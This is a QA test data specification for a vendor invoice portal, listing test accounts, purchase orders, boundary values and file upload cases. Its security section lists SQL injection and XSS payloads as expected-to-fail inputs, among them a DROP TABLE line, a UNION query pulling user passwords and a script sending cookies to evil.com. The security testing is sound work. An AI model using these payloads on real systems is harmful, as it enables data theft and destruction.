# Test Data

**Project:** Vendor Invoice Management Portal (B2B)
**Document Type:** Test Data Specification
**Phase:** Phase 3 — Test Design
**Prepared By:** QA Team
**Date:** June 2026

---

## Purpose

Test data is a critical QA artifact. Poorly prepared test data leads to:
- Missed bugs (happy path only)
- Invalid test results (wrong data used)
- Environment pollution (real data in test)

This document specifies **exact** test data for all test cases — not "a valid email" but "vendor.test@acmesupplies.com".

---

## Data Category Overview

| Category | Description | Purpose |
|----------|-------------|---------|
| Valid Data | Correctly formatted, within all limits | Happy path testing |
| Boundary Data | At, just below, and just above limits | Boundary value analysis |
| Invalid Data | Wrong format, missing, out of range | Negative testing |
| Negative/Adversarial | Injection attempts, special characters | Security testing |
| Integration Data | Values that trigger third-party calls | Integration testing |

---

## 1. User Accounts

### 1.1 Vendor Accounts

| User ID | Company Name | Email | Password | Status | Role |
|---------|-------------|-------|----------|--------|------|
| USR-V-001 | Acme Supplies Ltd | vendor.test1@acmesupplies.com | V3nd0r@Test1 | Active | Vendor |
| USR-V-002 | Beta Tech Solutions | vendor.test2@betatech.com | V3nd0r@Test2 | Active | Vendor |
| USR-V-003 | Gamma Trading Co | vendor.test3@gammatrading.com | V3nd0r@Test3 | Active | Vendor |
| USR-V-004 | Delta Services (Inactive) | vendor.test4@delta.com | V3nd0r@Test4 | Inactive | Vendor |
| USR-V-005 | Test Edge Case Vendor | vendor.test5@edge.com | V3nd0r@Test5 | Active | Vendor |

> Note: Passwords must comply with policy (min 8 chars, uppercase, number, special char)

### 1.2 AP Team Accounts

| User ID | Name | Email | Password | Status | Role |
|---------|------|-------|----------|--------|------|
| USR-AP-001 | AP User One | ap.user1@company.com | AP@User001 | Active | AP Team |
| USR-AP-002 | AP User Two | ap.user2@company.com | AP@User002 | Active | AP Team |
| USR-AP-003 | AP Supervisor | ap.super@company.com | AP@Super03 | Active | AP Supervisor |

### 1.3 Admin Accounts

| User ID | Name | Email | Password | Role |
|---------|------|-------|----------|------|
| USR-ADMIN-001 | System Admin | admin@company.com | Adm!n2026 | Administrator |

---

## 2. Purchase Orders (POs)

| PO Number | Vendor | PO Value | Available Balance | Status | Description |
|-----------|--------|----------|-------------------|--------|-------------|
| PO-2026-001 | Acme Supplies (USR-V-001) | $10,000.00 | $10,000.00 | Open | Office supplies Q2 |
| PO-2026-002 | Acme Supplies (USR-V-001) | $3,000.00 | $3,000.00 | Open | Cleaning services |
| PO-2026-003 | Beta Tech (USR-V-002) | $50,000.00 | $25,000.00 | Open | IT equipment (partial) |
| PO-2026-004 | Gamma Trading (USR-V-003) | $5,000.00 | $0.00 | Fully Invoiced | Catering |
| PO-2026-005 | Acme Supplies (USR-V-001) | $8,000.00 | $8,000.00 | Closed | Expired PO |
| PO-2026-006 | Delta Services (USR-V-004) | $2,000.00 | $2,000.00 | Open | Belongs to inactive vendor |

---

## 3. Invoice Data

### 3.1 Valid Invoice Test Data

| Invoice # | Vendor | PO | Amount | File | Description |
|-----------|--------|----|--------|------|-------------|
| INV-TEST-001 | USR-V-001 | PO-2026-001 | $4,500.00 | invoice_valid.pdf | Valid invoice — happy path |
| INV-TEST-002 | USR-V-001 | PO-2026-001 | $2,000.00 | invoice_excel.xlsx | Valid Excel invoice |
| INV-TEST-003 | USR-V-002 | PO-2026-003 | $10,000.00 | invoice_v2.pdf | For concurrent approval test |
| INV-TEST-004 | USR-V-003 | PO-2026-006 | $1,000.00 | invoice_inactive.pdf | From inactive vendor |

### 3.2 Boundary Invoice Data

| Scenario | Invoice # | Amount | Expected Outcome |
|----------|-----------|--------|-----------------|
| Exactly at PO limit | INV-BVA-001 | $10,000.00 (PO-2026-001 balance) | ACCEPTED |
| $1 above PO limit | INV-BVA-002 | $10,000.01 | REJECTED — amount exceeded |
| Minimum valid amount | INV-BVA-003 | $0.01 | ACCEPTED (if >0 is min) |
| Zero amount | INV-BVA-004 | $0.00 | REJECTED |
| Negative amount | INV-BVA-005 | -$100.00 | REJECTED |
| Very large valid amount | INV-BVA-006 | $49,999.99 against PO-2026-003 | ACCEPTED |

### 3.3 Duplicate Invoice Test Data

| Scenario | Invoice # | Action |
|----------|-----------|--------|
| First submission (succeeds) | INV-DUP-001 | Submit — expect SUCCESS |
| Second submission with same number | INV-DUP-001 | Submit again — expect REJECTED (duplicate) |

---

## 4. File Upload Test Data

| File Name | Size | Format | Expected Outcome |
|-----------|------|--------|-----------------|
| invoice_valid.pdf | 2 MB | PDF | ACCEPTED |
| invoice_excel.xlsx | 500 KB | Excel | ACCEPTED |
| invoice_image.jpg | 1.5 MB | JPEG | ACCEPTED |
| invoice_image.png | 3 MB | PNG | ACCEPTED |
| invoice_boundary_low.pdf | 9.9 MB | PDF | ACCEPTED (below limit) |
| invoice_boundary_exact.pdf | 10.0 MB | PDF | ACCEPTED (at limit) |
| invoice_boundary_high.pdf | 10.1 MB | PDF | REJECTED (above limit) |
| invoice_massive.pdf | 50 MB | PDF | REJECTED (far above limit) |
| invoice_empty.pdf | 0 KB | PDF | REJECTED (empty file) |
| malware_disguised.exe | 1 MB | Executable | REJECTED |
| invoice.html | 50 KB | HTML | REJECTED |
| invoice.bat | 10 KB | Batch script | REJECTED |
| invoice_corrupt.pdf | 2 MB | Corrupt PDF | REJECTED or handled gracefully |

---

## 5. Security / Adversarial Test Data

### 5.1 SQL Injection Payloads

| Field | Payload | Expected Outcome |
|-------|---------|-----------------|
| Invoice Number | `' OR '1'='1` | Treated as literal string, no SQL error |
| Invoice Number | `'; DROP TABLE invoices; --` | No table dropped; validation error |
| Vendor Name | `1 UNION SELECT username, password FROM users --` | No user data returned |
| Description | `'; INSERT INTO invoices VALUES (NULL); --` | No insert executed |
| PO Number | `%27%20OR%20%271%27%3D%271` | (URL-encoded) — same as above |

### 5.2 XSS Payloads

| Field | Payload | Expected Outcome |
|-------|---------|-----------------|
| Vendor Name (Registration) | `<script>alert('XSS')</script>` | Script NOT executed; escaped in display |
| Invoice Description | `<img src=x onerror=alert(1)>` | Script NOT executed |
| Rejection Reason (AP) | `"><script>fetch('evil.com?'+document.cookie)</script>` | NOT executed |

### 5.3 Boundary / Invalid Input Data

| Field | Test Value | Reason | Expected |
|-------|-----------|--------|----------|
| Email (registration) | `notanemail` | Invalid format | REJECTED |
| Email | `@domain.com` | Missing local part | REJECTED |
| Email | `user@.com` | Invalid domain | REJECTED |
| Email | `a@b.c` | Too short domain | Check per business rule |
| Password | `abc` | Too short | REJECTED |
| Password | `password` | No uppercase/numbers | REJECTED |
| Invoice Amount | `abc` | Non-numeric | REJECTED |
| Invoice Amount | `999999999999.99` | Very large number | Check against system max |
| Invoice Date | `32/13/2026` | Invalid date | REJECTED |
| Invoice Date | Future date (year 2099) | Far future | Check per business rule |

---

## 6. Performance Test Data

| Scenario | Data Volume | Target |
|----------|-------------|--------|
| Invoice list pagination | 1,000 invoices per vendor | Page load < 2s |
| Concurrent submissions | 100 simultaneous users | No errors, <5s |
| Report generation | 10,000 invoices in period | Report < 60s |
| Stress test | 500 concurrent users for 30 min | System stable |

Performance data to be seeded via:
```sql
-- Seed 1000 invoices for perf vendor
INSERT INTO invoices (vendor_id, po_id, amount, status, created_at)
SELECT 'perf-vendor', 'PO-PERF-001', 1000.00 + (n % 500), 'approved', 
       NOW() - INTERVAL (n || ' hours')
FROM generate_series(1, 1000) AS n;
```

---

## 7. Email Notification Test Accounts

| Role | Test Email | Purpose |
|------|-----------|---------|
| Vendor Test 1 | vendor.test1@acmesupplies.com | Receive approval/rejection notifications |
| Vendor Test 2 | vendor.test2@betatech.com | Second vendor notifications |
| AP Team | ap.user1@company.com | Receive submission notifications |
| Invalid Email | invalid@nonexistent12345abc.com | Test bounce handling |

> All test emails should route to a test inbox (e.g., Mailhog, Mailinator, or shared test account) — never to real production inboxes.

---

## 8. Data Cleanup Protocol

After each test run:
1. Reset invoice statuses for re-executable tests
2. Delete test invoices created during run (not seed data)
3. Reset PO balances to baseline values
4. Clear test email inboxes
5. Restore deactivated accounts if needed for next run

**Do NOT clean up:**
- Audit logs (must be preserved)
- Account creation records (soft delete only)

---

## Data Environment Mapping

| Data Set | Environment | Managed By |
|----------|-------------|-----------|
| Seed data (above) | QA / UAT | QA Team |
| Performance test data | QA Performance | QA + DevOps |
| Security test payloads | QA Security | QA Security |
| UAT data | Staging | Business + QA |

---

**Related Documents:**
- [Test Cases](test-design/test-cases.md)
- [Test Plan](test-plan.md)
- [RTM](rtm.md)
